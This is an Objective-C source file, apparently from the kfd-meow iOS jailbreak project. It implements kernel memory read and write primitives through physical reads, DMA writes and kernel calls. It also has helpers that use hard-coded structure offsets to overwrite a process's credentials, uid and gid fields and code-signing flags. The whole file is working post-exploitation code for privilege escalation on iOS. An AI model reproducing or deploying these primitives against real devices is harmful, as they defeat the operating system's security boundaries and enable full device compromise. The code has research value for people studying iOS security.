//
//  libmeow.m
//  kfd-meow
//
//  Created by doraaa on 2023/12/17.
//

#include "libmeow.h"

uint64_t kernel_base = 0;
uint64_t kernel_slide = 0;

uint64_t our_task = 0;
uint64_t our_proc = 0;
uint64_t kern_task = 0;
uint64_t kern_proc = 0;
uint64_t our_ucred = 0;
uint64_t kern_ucred = 0;

uint64_t gCpuTTEP = 0;
uint64_t gPhysBase = 0;
uint64_t gVirtBase = 0;

uint64_t data__gCpuTTEP = 0;
uint64_t data__gVirtBase = 0;
uint64_t data__gPhysBase = 0;

uint64_t add_x0_x0_0x40 = 0;
uint64_t container_init = 0;
uint64_t iogettargetand = 0;
uint64_t empty_kdata    = 0;
uint64_t mach_vm_alloc  = 0;
uint64_t trust_caches   = 0;
uint64_t ml_phys_read   = 0;
uint64_t ml_phys_write  = 0;

void set_offsets(void) {
    kernel_slide = get_kernel_slide();
    kernel_base = kernel_slide + KERNEL_BASE_ADDRESS;
    our_task = get_current_task();
    our_proc = get_current_proc();
    kern_task = get_kernel_task();
    kern_proc = get_kernel_proc();
    our_ucred = proc_get_ucred(our_proc);
    kern_ucred = proc_get_ucred(kern_proc);
    
    printf("kernel_slide : %016llx\n", kernel_slide);
    printf("kernel_base  : %016llx\n", kernel_base);
    printf("our_task     : %016llx\n", our_task);
    printf("our_proc     : %016llx\n", our_proc);
    printf("kern_task    : %016llx\n", kern_task);
    printf("kern_proc    : %016llx\n", kern_proc);
    printf("our_ucred    : %016llx\n", our_ucred);
    printf("kern_ucred   : %016llx\n", kern_ucred);
    
    offsetfinder64_kread();
}

/*---- krw ----*/
uint64_t kread64_phys(uint64_t pa)
{
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;

    u.u32[0] = (uint32_t)ealry_kcall(ml_phys_read, pa, 4, 0, 0, 0, 0, 0);;
    u.u32[1] = (uint32_t)ealry_kcall(ml_phys_read, pa+4, 4, 0, 0, 0, 0, 0);
    return u.u64;
}

void kwrite64_phys(uint64_t pa, uint64_t value) {
    ealry_kcall(ml_phys_write, pa, value, 8, 0, 0, 0, 0);
}

uint64_t kread64(uint64_t va) {
    if(isarm64e()) {
        return kread64_kfd(va);
    } else {
        return kread64_phys(vtophys_kfd(va));
    }
}

uint32_t kread32(uint64_t va) {
    if(isarm64e()) {
        return kread32_kfd(va);
    } else {
        union {
            uint32_t u32[2];
            uint64_t u64;
        } u;
        u.u64 = kread64(va);
        return u.u32[0];
    }
}

uint16_t kread16(uint64_t va) {
    if(isarm64e()) {
        return kread16_kfd(va);
    } else {
        union {
            uint16_t u16[4];
            uint64_t u64;
        } u;
        u.u64 = kread64(va);
        return u.u16[0];
    }
}

uint8_t kread8(uint64_t va) {
    if(isarm64e()) {
        return kread8_kfd(va);
    } else {
        union {
            uint8_t u8[8];
            uint64_t u64;
        } u;
        u.u64 = kread64(va);
        return u.u8[0];
    }
}

void kwrite64(uint64_t va, uint64_t val) {
    if(isarm64e()) {
        dma_perform(^{
            dma_writevirt64(va, val);
        });
    } else {
        kwrite64_phys(vtophys_kfd(va), val);
    }
}

void kwrite32(uint64_t va, uint32_t val) {
    if(isarm64e()) {
        dma_perform(^{
            dma_writevirt32(va, val);
        });
    } else {
        union {
            uint32_t u32[2];
            uint64_t u64;
        } u;
        u.u64 = kread64(va);
        u.u32[0] = val;
        kwrite64(va, u.u64);
    }
}

void kwrite16(uint64_t va, uint16_t val) {
    if(isarm64e()) {
        dma_perform(^{
            dma_writevirt16(va, val);
        });
    } else {
        union {
            uint16_t u16[4];
            uint64_t u64;
        } u;
        u.u64 = kread64(va);
        u.u16[0] = val;
        kwrite64(va, u.u64);
    }
}

void kwrite8(uint64_t va, uint8_t val) {
    if(isarm64e()) {
        dma_perform(^{
            dma_writevirt8(va, val);
        });
    } else {
        union {
            uint8_t u8[8];
            uint64_t u64;
        } u;
        u.u64 = kread64(va);
        u.u8[0] = val;
        kwrite64(va, u.u64);
    }
}

void kreadbuf(uint64_t va, void* ua, size_t size) {
    if(isarm64e()) {
        kreadbuf_kfd(va, ua, size);
    } else {
        uint64_t *v32 = (uint64_t*) ua;
        
        while (size) {
            size_t bytesToRead = (size > 8) ? 8 : size;
            uint64_t value = kread64(va);
            va += 8;
            
            if (bytesToRead == 8) {
                *v32++ = value;
            } else {
                memcpy(ua, &value, bytesToRead);
            }
            
            size -= bytesToRead;
        }
    }
}

void kwritebuf(uint64_t va, const void* ua, size_t size) {
    if(isarm64e()) {
        dma_writevirtbuf(va, ua, size);
    } else {
        uint8_t *v8 = (uint8_t*) ua;
        
        while (size >= 8) {
            kwrite64(va, *(uint64_t*)v8);
            size -= 8;
            v8 += 8;
            va += 8;
        }
        
        if (size) {
            uint64_t val = kread64(va);
            memcpy(&val, v8, size);
            kwrite64(va, val);
        }
    }
}

uint64_t kreadptr(uint64_t va) {
    uint64_t ptr = kread64(va);
    if ((ptr >> 55) & 1) {
        return ptr | 0xFFFFFF8000000000;
    }
    
    return ptr;
}

/*---- proc ----*/
uint64_t proc_get_proc_ro(uint64_t proc_ptr) {
    if(isAvailable() >= 10)
        return kread64_kfd(proc_ptr + 0x18);
    return kread64_kfd(proc_ptr + 0x20);
}

uint64_t proc_ro_get_ucred(uint64_t proc_ro_ptr) {
    return kread64_kfd(proc_ro_ptr + 0x20);
}

void proc_ro_set_ucred(uint64_t proc_ro_ptr, uint64_t ucred_ptr) {
    return kwrite64(proc_ro_ptr + 0x20, ucred_ptr);
}

uint64_t proc_get_ucred(uint64_t proc_ptr) {
    if(isAvailable() <= 5)
        return kread64_ptr_kfd(proc_ptr + 0xd8);
    return proc_ro_get_ucred(proc_get_proc_ro(proc_ptr));
}

void proc_set_ucred(uint64_t proc_ptr, uint64_t ucred_ptr) {
    if (isAvailable() <= 5)
        return kwrite64(proc_ptr + 0xd8, ucred_ptr);
    return proc_ro_set_ucred(proc_get_proc_ro(proc_ptr), ucred_ptr);
}

uint32_t proc_get_csflags(uint64_t proc) {
    if (isAvailable() <= 5)
        return kread32_kfd(proc + 0x300);
    uint64_t proc_ro = proc_get_proc_ro(proc);
    return kread32_kfd(proc_ro + 0x1c);
}

void proc_set_csflags(uint64_t proc, uint32_t csflags) {
    if (isAvailable() <= 5)
        return kwrite32(proc + 0x300, csflags);
    uint64_t proc_ro = proc_get_proc_ro(proc);
    return kwrite32(proc_ro + 0x1c, csflags);
}

uint32_t proc_get_svuid(uint64_t proc_ptr) {
    if (isAvailable() <= 5)
        return kread32_kfd(proc_ptr + 0x3c);
    return kread32_kfd(proc_ptr + 0x44);
}

void proc_set_svuid(uint64_t proc_ptr, uid_t svuid) {
    if (isAvailable() <= 5)
        return kwrite32(proc_ptr + 0x3c, svuid);
    return kwrite32(proc_ptr + 0x44, svuid);
}

uint32_t proc_get_svgid(uint64_t proc_ptr) {
    if (isAvailable() <= 5)
        return kread32_kfd(proc_ptr + 0x40);
    return kread32_kfd(proc_ptr + 0x48);
}

void proc_set_svgid(uint64_t proc_ptr, uid_t svgid) {
    if (isAvailable() <= 5)
        return kwrite32(proc_ptr + 0x40, svgid);
    return kwrite32(proc_ptr + 0x48, svgid);
}

uint32_t proc_get_p_flag(uint64_t proc_ptr) {
    if (isAvailable() <= 5)
        return kread32_kfd(proc_ptr + 0x1bc);
    return kread32_kfd(proc_ptr + 0x264);
}

void proc_set_p_flag(uint64_t proc_ptr, uint32_t p_flag) {
    if (isAvailable() <= 5)
        return kwrite32(proc_ptr + 0x1bc, p_flag);
    return kwrite32(proc_ptr + 0x264, p_flag);
}

uint32_t ucred_get_uid(uint64_t ucred_ptr) {
    uint64_t cr_posix_ptr = ucred_ptr + 0x18;
    return kread32_kfd(cr_posix_ptr + 0x0);
}

void ucred_set_uid(uint64_t ucred_ptr, uint32_t uid) {
    uint64_t cr_posix_ptr = ucred_ptr + 0x18;
    return kwrite32(cr_posix_ptr + 0x0, uid);
}

uint32_t ucred_get_svuid(uint64_t ucred_ptr) {
    uint64_t cr_posix_ptr = ucred_ptr + 0x18;
    return kread32_kfd(cr_posix_ptr + 0x8);
}

void ucred_set_svuid(uint64_t ucred_ptr, uint32_t svuid) {
    uint64_t cr_posix_ptr = ucred_ptr + 0x18;
    return kwrite32(cr_posix_ptr + 0x8, svuid);
}

uint32_t ucred_get_cr_groups(uint64_t ucred_ptr) {
    uint64_t cr_posix_ptr = ucred_ptr + 0x18;
    return kread32_kfd(cr_posix_ptr + 0x10);
}

void ucred_set_cr_groups(uint64_t ucred_ptr, uint32_t cr_groups) {
    uint64_t cr_posix_ptr = ucred_ptr + 0x18;
    return kwrite32(cr_posix_ptr + 0x10, cr_groups);
}

uint32_t ucred_get_svgid(uint64_t ucred_ptr) {
    uint64_t cr_posix_ptr = ucred_ptr + 0x18;
    return kread32_kfd(cr_posix_ptr + 0x54);
}

void ucred_set_svgid(uint64_t ucred_ptr, uint32_t svgid) {
    uint64_t cr_posix_ptr = ucred_ptr + 0x18;
    return kwrite32(cr_posix_ptr + 0x54, svgid);
}

uint64_t ucred_get_cr_label(uint64_t ucred_ptr) {
    return kread64_ptr_kfd(ucred_ptr + 0x78);
}
